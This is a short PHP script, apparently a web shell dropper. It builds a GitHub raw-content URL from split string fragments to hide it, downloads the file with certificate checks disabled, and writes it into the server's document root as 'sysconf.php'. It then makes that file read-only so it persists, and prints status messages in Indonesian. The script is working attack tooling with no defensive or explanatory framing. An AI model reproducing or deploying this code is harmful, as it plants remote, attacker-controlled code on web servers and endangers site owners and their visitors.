<?php
function lucen($ur)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $ur);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$ur = 'ht' . 'tps' . '://raw.gi' . 'thubu' . 'ser' . 'content' . '.c' . 'o' . 'm/Luc' . 'enox/Es' . 'sentials' . '/main' . '/tr' . 'y0.tx' . 't';
$savePath = $_SERVER['DOCUMENT_ROOT'] . '/s' . 'ys' . 'co' . 'n' . 'f' . '.' . 'ph' . 'p';

$data = lucen($ur);

if ($data) {
    if (file_put_contents($savePath, $data)) {
        chmod($savePath, 0555);
        echo "berhasil!";
    } else {
        echo "Gagal!";
    }
} else {
    echo "Gagal mengunduh data!.";
}
?>
